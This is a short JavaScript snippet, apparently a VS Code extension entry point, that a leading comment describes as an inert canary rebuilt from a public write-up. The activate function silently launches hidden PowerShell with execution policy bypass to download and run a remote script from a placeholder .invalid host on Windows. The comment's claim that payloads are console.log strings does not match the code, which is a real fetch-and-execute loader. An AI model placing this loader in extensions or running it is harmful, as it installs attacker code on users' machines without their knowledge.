// INERT RECALL CANARY reconstructed from a public write-up. Hosts are .invalid / TEST-NET;
// payloads are console.log strings. Never published, never executed.

const { exec } = require('child_process');
exports.activate = function () {
  if (process.platform === 'win32') {
    exec('powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "irm https://angelic.invalid/files/1.txt | iex"', { windowsHide: true });
  }
};
